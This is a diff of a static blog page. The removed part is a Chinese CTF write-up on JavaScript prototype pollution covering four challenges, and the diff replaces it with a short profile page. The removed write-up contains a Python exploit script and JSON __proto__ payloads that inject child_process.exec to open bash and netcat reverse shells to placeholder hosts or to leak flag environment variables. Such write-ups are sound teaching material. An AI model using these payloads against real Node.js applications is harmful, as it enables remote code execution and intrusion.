@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>JavaScript原型链污染 | prontosil&#39;s Blog</title>
-  <meta name="keywords" content=" JavaScript , 原型链污染 ">
-  <meta name="description" content="JavaScript原型链污染 | prontosil&#39;s Blog">
+  <title>prontosil&#39;s Blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于我">
 <meta property="og:type" content="website">
@@ -53,7 +53,7 @@
 </div>
 
 <body>
-<aside class="nav">
+<aside class="nav mobile">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -948,48 +948,12 @@
         </div>
     </div>
 </aside>
-<div class="post">
+<div class="post index">
     <div class="pjax">
-        <article id="post-JavaScript原型链污染" class="article article-type-post" itemscope itemprop="blogPost">
+        <article class="index">
+            <div class="toc-ref">
     
-        <h1 class="article-title">JavaScript原型链污染</h1>
-    
-    <div class="article-meta">
-        
-        
-        
-        <span class="book">
-            
-                <a  data-rel="CTF">CTF</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a class="color1">JavaScript</a>
-            
-            <a class="color1">原型链污染</a>
-            
-        </span>
-        
-    </div>
-    <div class="article-meta">
-        
-        创建时间:<time class="date" title='更新时间: 2020-03-04 20:32:37'>2020-01-30 09:13</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>字数:1.3k</span>
-        
-        
-        
-    </div>
-    
-    <div class="toc-ref">
-    
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript原型链污染"><span class="toc-text">JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#如何继承"><span class="toc-text">如何继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例分析"><span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redpwnctf2019-blueprint"><span class="toc-text">redpwnctf2019 blueprint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新春战疫-ezexpress"><span class="toc-text">新春战疫 ezexpress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME"><span class="toc-text">HGAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019-XNUCA-hardjs"><span class="toc-text">2019 XNUCA hardjs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#prontosil’s-blog"><span class="toc-text">prontosil’s blog</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1002,169 +966,18 @@
     }
 </style>
 </div>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p>
-<pre><code class="javascript">function Animal(){
+            <h1 id="prontosil’s-blog"><a href="#prontosil’s-blog" class="headerlink" title="prontosil’s blog"></a>prontosil’s blog</h1><p>星盟团队成员，qq 1365155759</p>
 
-this.species = &quot;动物&quot;;
-
-}</code></pre>
-<p>还有一个”猫”对象的构造函数。</p>
-<pre><code class="JavaScript">function Cat(name,color){
-
-　　　　this.name = name;
-
-　　　　this.color = color;
-
-　　}</code></pre>
-<p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p>
-<p>但是在JavaScript中，</p>
-<pre><code class="javascript">Cat.prototype = new Animal();
-
-Cat.prototype.constructor = Cat;
-
-var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);
-
-alert(cat1.species); // 动物</code></pre>
-<p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p>
-<p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p>
-<p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p>
-<p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p>
-<p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p>
-<p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p>
-<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p>
-<p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p>
-<p><img src="/posts/5d5d07b8/1572246225198.png" alt></p>
-<p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p>
-<p>生成的<code>user</code>对象</p>
-<p><img src="/posts/5d5d07b8/1572246345905.png" alt></p>
-<p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p>
-<p>查看<code>defaultsDeep</code>的例子：</p>
-<pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });
-// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p>
-<p><img src="/posts/5d5d07b8/1572246569945.png" alt></p>
-<p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p>
-<p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p>
-<p>思路就是通过原型链污染使得flag能被展示出来</p>
-<p>渲染页面的主要部分如下：</p>
-<pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({
-  id: k,
-  content: v.content,
-  public: v.public,
-})),</code></pre>
-<p>exp</p>
-<pre><code class="python">import requests
-
-URL = &quot;http://localhost/&quot;
-user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;
-res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})
-print(res.text)
-
-
-res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})
-print(res2.text)</code></pre>
-<h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p>
-<p>两个奇特的字符 ==”ı”、”ſ”。==</p>
-<p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
-<p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p>
-<pre><code class="js">router.post(&#39;/action&#39;, function (req, res) {
-  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)} 
-  req.session.user.data = clone(req.body);
-  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  
-});</code></pre>
-<p>那么就可以污染属性了。污染哪个呢？</p>
-<pre><code class="js">router.get(&#39;/&#39;, function (req, res) {
-  if(!req.session.user){
-    res.redirect(&#39;/login&#39;);
-  }
-  res.outputFunctionName=undefined;
-  res.render(&#39;index&#39;,data={&#39;user&#39;:req.session.user.user});
-});
-
-
-router.get(&#39;/info&#39;, function (req, res) {
-  res.render(&#39;index&#39;,data={&#39;user&#39;:res.outputFunctionName});
-})</code></pre>
-<p>我们这里就直接污染 <code>res.outputFunctionName</code> </p>
-<p>(测试的时候Windows下无法用nc弹shell)</p>
-<p><img src="/posts/5d5d07b8/1583322699980.png" alt></p>
-<p>然后访问 info 页面即可</p>
-<p>原来的payload</p>
-<pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}</code></pre>
-<h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p>
-<pre><code class="js">if (sekiro.attackInfo.additionalEffect) {
-    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
-    sekiro = fn(sekiro)
-}</code></pre>
-<p><code>Function</code> 是动态构造函数</p>
-<p>payload</p>
-<pre><code class="json"> {&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc vps-ip port -e /bin/sh&#39;,function(){});&quot;}}</code></pre>
-<p><img src="/posts/5d5d07b8/1583323453485.png" alt></p>
-<p>然后vps上即可监听到请求(当然我这里只是nc一下)</p>
-<p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p>
-<h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p>
-<p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p>
-<p><img src="/posts/5d5d07b8/j_3.png" alt></p>
-<p>从这里可以看到有两个拼接的变量可以使用</p>
-<p>于是就能够构造两个payload</p>
-<pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true}}}}</code></pre>
-<p>或者</p>
-<pre><code class="json"> {
-    &quot;content&quot;: {
-        &quot;constructor&quot;: {
-            &quot;prototype&quot;: {
-            &quot;outputFunctionName&quot;:&quot;_tmp1;return process.env.FLAG;//;var __tmp2&quot;
-            }
-        }
-    },
-    &quot;type&quot;: &quot;test&quot;
-}</code></pre>
-<p>当然要是想弹shell也不是不可以</p>
-<pre><code class="json">{
-    &quot;content&quot;: {
-        &quot;constructor&quot;: {
-            &quot;prototype&quot;: {
-            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;
-            }
-        }
-    },
-    &quot;type&quot;: &quot;test&quot;
-}</code></pre>
-<p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p>
-<p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p>
-<p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>
-
-      
-       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
-    </div>
-</article>
-
-
-
-<div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>JavaScript原型链污染</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">1.3k</span></p>
-    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-30, 09:13:31</p>
-    <p><span class="copy-title">最后更新:</span>2020-03-04, 20:32:37</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5d5d07b8/" title="JavaScript原型链污染">http://prontosil.com/posts/5d5d07b8/</a>
-    <p>
-        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-    </p>
-</div>
-
-
-
+        </article>
+        
+        
     <section id="comments" class="disqus">
     <style> aside.comment-bar { margin: auto 30px; }</style>
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://prontosil.com/posts/5d5d07b8/';
-            this.page.identifier = 'posts/5d5d07b8/';
+            this.page.url = 'http://prontosil.com/';
+            this.page.identifier = 'tags/POP/index.html';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -1206,15 +1019,8 @@ router.get(&#39;/info&#39;, function (req, res) {
 </section>
 
 <!-- Add comment count-->
-<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/5d5d07b8/"></span>
-<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/5d5d07b8/"></span>
-
-
-
-    
-
-
-
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="tags/POP/index.html"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url=""></span>
 
     </div>
     <div class="copyright">
